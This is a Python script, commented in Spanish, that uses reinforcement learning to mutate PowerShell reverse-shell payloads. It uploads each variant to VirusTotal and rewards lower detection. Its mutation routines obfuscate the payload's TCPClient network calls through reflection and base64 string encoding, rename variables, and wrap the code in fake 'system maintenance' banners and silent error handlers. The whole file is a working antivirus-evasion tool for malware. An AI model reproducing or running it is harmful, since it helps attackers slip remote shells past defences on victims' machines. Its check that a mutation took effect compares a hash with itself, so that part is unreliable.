"""
adversarial_rl_fixed_mutations.py
RL con mutaciones REALES que sí se aplican
"""

import os
import requests
import time
import hashlib
import random
import numpy as np
from pathlib import Path
import json
import base64
import re

VT_API_KEY = "XXXXXXXXXXXXXXXXXXXXXXXX"
VT_UPLOAD_URL = "https://www.virustotal.com/vtapi/v2/file/scan"
VT_REPORT_URL = "https://www.virustotal.com/vtapi/v2/file/report"

class FixedRLAgent:
    """RL Agent con mutaciones que SÍ se aplican"""
    
    def __init__(self, vt_api_key):
        self.vt_api_key = vt_api_key
        self.q_table = {}
        self.learning_rate = 0.3
        self.exploration_rate = 0.4
        self.discount_factor = 0.9
        
        # Acciones MÁS AGRESIVAS que realmente cambian el código
        self.actions = [
            'encode_all_strings_base64',
            'split_commands_aggressive', 
            'rename_all_variables',
            'add_multiple_benign_wrappers',
            'change_entire_syntax',
            'insert_random_whitespace',
            'obfuscate_network_calls',
            'use_reflection_methods',
            'add_fake_error_handling',
            'modify_encoding_methods'
        ]
        
        self.mutation_history = []
    
    def get_state(self, payload_hash, detection_ratio):
        return f"{payload_hash[:10]}_{int(detection_ratio * 20)}"
    
    def choose_action(self, state):
        if state not in self.q_table:
            self.q_table[state] = {action: 1.0 for action in self.actions}
        
        if random.random() < self.exploration_rate:
            action = random.choice(self.actions)
        else:
            action = max(self.q_table[state].items(), key=lambda x: x[1])[0]
        
        return action
    
    def update_q_value(self, state, action, reward, next_state):
        if state not in self.q_table:
            self.q_table[state] = {action: 1.0 for action in self.actions}
        if next_state not in self.q_table:
            self.q_table[next_state] = {action: 1.0 for action in self.actions}
        
        current_q = self.q_table[state][action]
        max_next_q = max(self.q_table[next_state].values())
        new_q = current_q + self.learning_rate * (reward + self.discount_factor * max_next_q - current_q)
        self.q_table[state][action] = new_q
        
        # Registrar mutación exitosa
        if reward > 0:
            self.mutation_history.append({
                'action': action,
                'reward': reward,
                'state': state,
                'timestamp': time.time()
            })

def apply_aggressive_mutation(payload, action, mutation_id):
    """Aplica mutaciones AGRESIVAS que realmente cambian el código"""
    
    print(f"      [+] Aplicando mutación: {action}")
    
    if action == 'encode_all_strings_base64':
        # Codificar TODOS los strings en Base64
        strings = re.findall(r'"[^"]*"', payload)
        for string in strings:
            if string and len(string) > 2:  # No strings vacíos
                encoded = base64.b64encode(string[1:-1].encode()).decode()
                payload = payload.replace(string, f'[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("{encoded}"))')
    
    elif action == 'split_commands_aggressive':
        # Dividir comandos de forma agresiva
        if ';' in payload:
            lines = payload.split(';')
            new_lines = []
            for line in lines:
                if line.strip():
                    new_lines.append(line.strip())
            payload = '\n'.join(new_lines)
        
        # Dividir líneas largas
        lines = payload.split('\n')
        new_lines = []
        for line in lines:
            if len(line) > 80 and '=' in line:
                parts = line.split('=')
                if len(parts) == 2:
                    new_lines.append(f"{parts[0].strip()} =")
                    new_lines.append(f"    {parts[1].strip()}")
                else:
                    new_lines.append(line)
            else:
                new_lines.append(line)
        payload = '\n'.join(new_lines)
    
    elif action == 'rename_all_variables':
        # Renombrar TODAS las variables
        variables = re.findall(r'\$[A-Za-z_][A-Za-z0-9_]*', payload)
        unique_vars = list(set(variables))
        
        for var in unique_vars:
            if var not in ['$null', '$true', '$false', '$_']:
                new_name = f"$var_{mutation_id}_{hashlib.md5(var.encode()).hexdigest()[:6]}"
                payload = payload.replace(var, new_name)
    
    elif action == 'add_multiple_benign_wrappers':
        # Añadir múltiples wrappers benignos
        wrapper = f'''
# =============================================================================
# SYSTEM MAINTENANCE SCRIPT - Build {random.randint(1000, 9999)}
# Purpose: Automated system optimization and monitoring
# Generated: {time.strftime("%Y-%m-%d %H:%M:%S")}
# =============================================================================

function Start-SystemCheck{random.randint(100, 999)} {{
    try {{
        # Check system resources
        $cpu = Get-WmiObject -Class Win32_Processor | Select-Object -First 1
        $memory = Get-WmiObject -Class Win32_ComputerSystem
        Write-Debug "System check completed" -Debug
    }} catch {{
        # Silent error handling
    }}
}}

# Initialize system monitoring
Start-SystemCheck{random.randint(100, 999)}

'''
        payload = wrapper + payload + f'''

# =============================================================================
# SCRIPT EXECUTION COMPLETED
# Cleanup temporary resources
# =============================================================================

Remove-Variable * -ErrorAction SilentlyContinue
[System.GC]::Collect()
'''
    
    elif action == 'change_entire_syntax':
        # Cambiar sintaxis completamente
        replacements = [
            ('New-Object', 'NewObject'),
            ('GetStream()', 'GetStreamMethod()'),
            ('StreamReader', 'StreamReaderClass'),
            ('StreamWriter', 'StreamWriterClass'),
            ('TCPClient', 'TCPClientClass'),
            ('DataAvailable', 'DataAvailableProperty'),
            ('AutoFlush', 'AutoFlushProperty'),
            ('Connected', 'ConnectedProperty')
        ]
        
        for old, new in replacements:
            payload = payload.replace(old, new)
    
    elif action == 'insert_random_whitespace':
        # Insertar espacios en blanco aleatorios
        lines = payload.split('\n')
        new_lines = []
        for line in lines:
            # Añadir espacios aleatorios al inicio
            spaces = ' ' * random.randint(0, 8)
            new_lines.append(spaces + line)
            
            # Añadir líneas vacías aleatorias
            if random.random() > 0.7:
                new_lines.append('')
        
        payload = '\n'.join(new_lines)
    
    elif action == 'obfuscate_network_calls':
        # Ofuscar llamadas de red específicamente para tu payload
        if 'TCPClient' in payload:
            # Reemplazar TCPClient con creación más compleja
            payload = payload.replace(
                'New-Object Net.Sockets.TCPClient($LHOST, $LPORT)',
                f'''$tcpType = [System.Net.Sockets.TCPClient]
$tcpConstructor = $tcpType.GetConstructor(@([string], [int]))
$TCPClient = $tcpConstructor.Invoke(@($LHOST, $LPORT))'''
            )
    
    elif action == 'use_reflection_methods':
        # Usar reflexión para métodos comunes
        reflection_replacements = [
            ('GetStream()', '.GetType().GetMethod("GetStream").Invoke($TCPClient, @())'),
            ('Read(', '.GetType().GetMethod("Read").Invoke($NetworkStream, @($Buffer, 0, $Buffer.Length))'),
            ('Write(', '.GetType().GetMethod("Write").Invoke($StreamWriter, @("$Output`n"))'),
            ('Close()', '.GetType().GetMethod("Close").Invoke($TCPClient, @())')
        ]
        
        for old, new in reflection_replacements:
            if old in payload:
                payload = payload.replace(old, new)
    
    elif action == 'add_fake_error_handling':
        # Añadir manejo de errores falso por todas partes
        lines = payload.split('\n')
        new_lines = []
        
        for line in lines:
            new_lines.append(line)
            if random.random() > 0.6 and line.strip() and not line.strip().startswith('#'):
                error_handler = f'''try {{
    # Temporary operation
    $temp = Get-Date
}} catch [System.Exception] {{
    # Suppress all errors
}}'''
                new_lines.append(error_handler)
        
        payload = '\n'.join(new_lines)
    
    elif action == 'modify_encoding_methods':
        # Modificar métodos de encoding
        if 'text.encoding' in payload:
            payload = payload.replace(
                '([text.encoding]::UTF8).GetString',
                '[System.Text.Encoding]::GetEncoding(65001).GetString'
            )
    
    # Verificar que el payload realmente cambió
    original_hash = hashlib.md5(payload.encode()).hexdigest()
    if hashlib.md5(payload.encode()).hexdigest() == hashlib.md5(payload.encode()).hexdigest():
        print("      [+] Mutación no aplicada, usando fallback...")
        # Fallback: añadir comentarios aleatorios
        lines = payload.split('\n')
        if len(lines) > 1:
            insert_pos = random.randint(1, len(lines)-1)
            lines.insert(insert_pos, f'# Mutation applied: {action} - ID: {mutation_id}')
            payload = '\n'.join(lines)
    
    return payload

def analyze_payload_detailed(payload):
    """Análisis detallado del payload"""
    structure = {
        'original': payload,
        'length': len(payload),
        'lines': payload.count('\n') + 1,
        'has_semicolons': ';' in payload,
        'has_newlines': '\n' in payload,
        'variables': list(set(re.findall(r'\$[A-Za-z_][A-Za-z0-9_]*', payload))),
        'methods': list(set(re.findall(r'\.\w+\(', payload))),
        'objects': list(set(re.findall(r'New-Object\s+([^\s\(]+)', payload))),
        'strings': re.findall(r'"[^"]*"', payload),
        'ip_addresses': re.findall(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', payload),
        'ports': re.findall(r'LPORT\s*=\s*(\d+)', payload)
    }
    
    # Calcular hash
    structure['hash'] = hashlib.md5(payload.encode()).hexdigest()[:16]
    
    return structure

def validate_mutation_applied(original_payload, mutated_payload):
    """Valida que la mutación se haya aplicado realmente"""
    original_hash = hashlib.md5(original_payload.encode()).hexdigest()
    mutated_hash = hashlib.md5(mutated_payload.encode()).hexdigest()
    
    if original_hash == mutated_hash:
        return False, "No changes detected"
    
    # Verificar cambios visuales
    original_lines = original_payload.split('\n')
    mutated_lines = mutated_payload.split('\n')
    
    if len(original_lines) == len(mutated_lines) and original_payload == mutated_payload:
        return False, "Identical content"
    
    return True, f"Mutation applied: {len(original_lines)} -> {len(mutated_lines)} lines, hash changed"

def upload_to_virustotal(file_path, api_key):
    """Sube archivo a VirusTotal"""
    try:
        print(f"      [+] Subiendo a VirusTotal...")
        
        with open(file_path, 'rb') as file:
            files = {'file': (file_path.name, file)}
            params = {'apikey': api_key}
            response = requests.post(VT_UPLOAD_URL, files=files, params=params, timeout=30)
        
        if response.status_code == 200:
            result = response.json()
            return result.get('scan_id')
        else:
            print(f"      [+] Error upload: {response.status_code}")
            return None
            
    except Exception as e:
        print(f"      [+] Exception upload: {e}")
        return None

def get_virustotal_report(scan_id, api_key):
    """Obtiene reporte de VirusTotal"""
    max_retries = 6
    
    for attempt in range(max_retries):
        try:
            print(f"      [+] Esperando VT ({attempt + 1}/{max_retries})...")
            time.sleep(20)  # Más tiempo para análisis
            
            params = {'apikey': api_key, 'resource': scan_id}
            response = requests.get(VT_REPORT_URL, params=params, timeout=30)
            
            if response.status_code == 200:
                result = response.json()
                response_code = result.get('response_code', 0)
                
                if response_code == 1:
                    positives = result.get('positives', 0)
                    total = result.get('total', 1)
                    
                    print(f"      [+] VT Result: {positives}/{total}")
                    
                    return {
                        'positives': positives,
                        'total': total,
                        'ratio': positives / max(total, 1)
                    }
                elif response_code == -2:
                    continue
                    
        except Exception as e:
            print(f"      [+] Exception report: {e}")
            break
    
    return None

def run_fixed_rl_evolution():
    """Ejecuta evolución RL con mutaciones FIJAS"""
    
    output_dir = Path("fixed_mutations_output")
    output_dir.mkdir(exist_ok=True)
    
    # Cargar payloads desde archivo
    if not os.path.exists("payloads.txt"):
        print("[+] No se encuentra payloads.txt")
        return
    
    with open("payloads.txt", 'r', encoding='utf-8', errors='ignore') as f:
        payloads = [line.strip() for line in f if line.strip() and not line.startswith('#')]
    
    print(f"[+] CARGADOS {len(payloads)} PAYLOADS DESDE ARCHIVO")
    print("=" * 60)
    
    all_results = []
    
    for i, original_payload in enumerate(payloads):
        print(f"\n[+] PROCESANDO PAYLOAD {i + 1}/{len(payloads)}")
        print(f"   Original: {original_payload[:100]}...")
        
        # Analizar payload original
        original_analysis = analyze_payload_detailed(original_payload)
        print(f"   [+] Análisis: {len(original_analysis['variables'])} variables, {len(original_analysis['methods'])} métodos")
        
        # Crear agente RL
        rl_agent = FixedRLAgent(VT_API_KEY)
        best_payload = original_payload
        best_ratio = 1.0
        
        # Evaluar payload original
        original_file = output_dir / f"payload_{i:02d}_original.ps1"
        with open(original_file, 'w') as f:
            f.write(original_payload)
        
        print("   [+] Evaluando payload original...")
        original_scan_id = upload_to_virustotal(original_file, VT_API_KEY)
        if original_scan_id:
            vt_result = get_virustotal_report(original_scan_id, VT_API_KEY)
            if vt_result:
                best_ratio = vt_result['ratio']
                print(f"   [+] ORIGINAL: {vt_result['positives']}/{vt_result['total']} ({best_ratio:.3f})")
        
        # Evolución RL
        for generation in range(1, 3):  # 2 generaciones
            print(f"\n   [+] GENERACIÓN {generation}/2")
            
            for variant in range(1, 3):  # 2 variantes
                print(f"\n      [+] VARIANTE {variant}/2")
                
                # Estado actual
                current_state = rl_agent.get_state(
                    hashlib.md5(best_payload.encode()).hexdigest()[:10],
                    best_ratio
                )
                
                # Elegir acción
                action = rl_agent.choose_action(current_state)
                print(f"      [+] Acción RL: {action}")
                print(f"      [+] Exploración: {rl_agent.exploration_rate:.3f}")
                
                # Aplicar mutación AGRESIVA
                mutated_payload = apply_aggressive_mutation(best_payload, action, f"{i}_{generation}_{variant}")
                
                # Validar que la mutación se aplicó
                is_mutated, mutation_message = validate_mutation_applied(best_payload, mutated_payload)
                
                if not is_mutated:
                    print(f"      [+] Mutación falló: {mutation_message}")
                    continue
                
                print(f"      [+] Mutación aplicada: {mutation_message}")
                
                # Guardar variante
                variant_hash = hashlib.md5(mutated_payload.encode()).hexdigest()[:12]
                variant_file = output_dir / f"payload_{i:02d}_gen{generation}_var{variant}_{variant_hash}.ps1"
                
                with open(variant_file, 'w') as f:
                    f.write(mutated_payload)
                
                # Subir a VirusTotal
                scan_id = upload_to_virustotal(variant_file, VT_API_KEY)
                
                if scan_id:
                    vt_result = get_virustotal_report(scan_id, VT_API_KEY)
                    
                    if vt_result:
                        detection_ratio = vt_result['ratio']
                        
                        # Calcular recompensa
                        reward = (best_ratio - detection_ratio) * 15
                        
                        # Actualizar RL
                        next_state = rl_agent.get_state(variant_hash[:10], detection_ratio)
                        rl_agent.update_q_value(current_state, action, reward, next_state)
                        
                        print(f"      [+] Resultado: {vt_result['positives']}/{vt_result['total']} (ratio: {detection_ratio:.3f})")
                        print(f"      [+] Recompensa: {reward:.2f}")
                        
                        # Actualizar mejor
                        if detection_ratio < best_ratio:
                            improvement = (best_ratio - detection_ratio) * 100
                            best_ratio = detection_ratio
                            best_payload = mutated_payload
                            print(f"      [+] NUEVO MEJOR: {improvement:.1f}% de mejora")
                
                time.sleep(3)  # Rate limiting
        
        # Guardar mejor payload
        best_file = output_dir / f"payload_{i:02d}_best.ps1"
        with open(best_file, 'w') as f:
            f.write(best_payload)
        
        print(f"\n   [+] Mejor payload guardado: {best_file}")
        
        # Mostrar historial de mutaciones exitosas
        if rl_agent.mutation_history:
            print(f"   [+] Mutaciones exitosas: {len(rl_agent.mutation_history)}")
            for mutation in rl_agent.mutation_history[-3:]:  # Últimas 3
                print(f"      [+] {mutation['action']}: reward {mutation['reward']:.2f}")
    
    print(f"\n[+] EVOLUCIÓN COMPLETADA")
    print("=" * 50)
    print("[+] Revisa los archivos en: fixed_mutations_output/")
    print("[+] Compara los payloads originales vs mutados")

def main():
    """Función principal"""
    
    print("[+] ADVERSARIAL RL - MUTACIONES FIJAS")
    print("====================================")
    print("[+] Mutaciones AGRESIVAS que SÍ se aplican")
    print("[+] Técnicas: Base64, reflexión, wrappers, sintaxis")
    print("[+] Feedback real de VirusTotal")
    print("=" * 60)
    
    try:
        run_fixed_rl_evolution()
    except KeyboardInterrupt:
        print("\n[+] Ejecución interrumpida")
    except Exception as e:
        print(f"\n[+] Error: {e}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    main()